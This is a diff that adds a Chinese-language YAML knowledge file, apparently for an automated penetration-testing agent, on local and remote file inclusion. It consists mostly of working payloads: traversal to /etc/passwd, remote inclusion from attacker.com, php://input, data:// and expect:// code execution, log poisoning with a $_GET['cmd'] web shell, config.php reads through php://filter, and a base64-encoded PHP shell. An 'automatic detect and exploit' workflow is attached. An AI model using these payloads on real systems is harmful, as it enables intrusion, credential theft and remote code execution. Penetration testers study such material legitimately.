@@ -1,0 +1,143 @@
+name: "本地文件包含"
+description: "LFI漏洞利用和文件读取技术"
+domain: "web"
+version: "1.0"
+tags:
+  - web
+  - lfi
+  - file-inclusion
+
+knowledge: |
+  # LFI/RFI文件包含
+  
+  ## 1. 本地文件包含
+  
+  ```
+  ?page=../../../../etc/passwd
+  ?page=/etc/passwd
+  ?page=....//....//....//etc/passwd
+  ?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+  ```
+  
+  ## 2. 远程文件包含
+  
+  ```
+  ?page=http://attacker.com/shell.txt
+  ?page=php://input
+  ```
+  
+  ## 3. 伪协议利用
+  
+  ### PHP://input
+  
+  ```
+  ?page=php://input
+  POST: <?php system('id'); ?>
+  ```
+  
+  ### PHP://filter
+  
+  ```
+  ?page=php://filter/read=convert.base64-encode/resource=config.php
+  ```
+  
+  ### data://
+  
+  ```
+  ?page=data://text/plain,<?php system('id');?>
+  ```
+  
+  ### expect://
+  
+  ```
+  ?page=expect://id
+  ```
+  
+  ## 4. 日志投毒
+  
+  ### Apache日志
+  
+  ```
+  访问: <?php system($_GET['cmd']);?>
+  ?page=/var/log/apache2/access.log&cmd=id
+  ```
+  
+  ### SSH日志
+  
+  ```
+  ssh "<?php system('id');?>"@target.com
+  ?page=/var/log/auth.log&cmd=id
+  ```
+  
+  ## 5. Proc文件系统
+  
+  ```
+  /proc/self/environ
+  /proc/self/fd/xxx
+  /proc/version
+  /proc/cmdline
+  ```
+  
+  ## 6. 目录遍历
+  
+  ```
+  ?page=....//....//....//etc/passwd
+  ?page=..%2f..%2f..%2fetc%2fpasswd
+  ?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  ```
+  
+  ## 7. PHP Filter链
+  
+  ```
+  php://filter/convert.base64-encode/resource=config.php
+  php://filter/zlib.deflate/convert.base64-encode/resource=config.php
+  ```
+  
+  ## 8. Phar反序列化
+  
+  利用Phar://协议触发反序列化
+  
+  ## 9. Session文件包含
+  
+  ```
+  ?page=/tmp/sess_xxxxx
+  ```
+  
+  ## 10. 绕过技术
+  
+  ### 空字节截断
+  
+  ```
+  ?page=shell.php%00.txt
+  ```
+  
+  ### 协议叠加
+  
+  ```
+  ?page=php://filter/convert.base64-encode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+  ```
+  
+
+workflows:
+  - name: "自动检测和利用"
+    description: "自动检测漏洞并尝试利用"
+    steps:
+      - description: "信息收集和漏洞探测"
+        expected_output: "发现潜在漏洞点"
+      - description: "漏洞验证"
+        expected_output: "确认漏洞存在"
+      - description: "漏洞利用"
+        expected_output: "成功利用漏洞"
+
+tool_preferences:
+  nmap:
+    score: 0.8
+    reason: "端口和服务扫描"
+  nuclei:
+    score: 0.9
+    reason: "漏洞扫描"
+
+examples:
+  - scenario: "发现漏洞并获取敏感信息"
+    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
+    tools_used: ["nmap", "nuclei"]
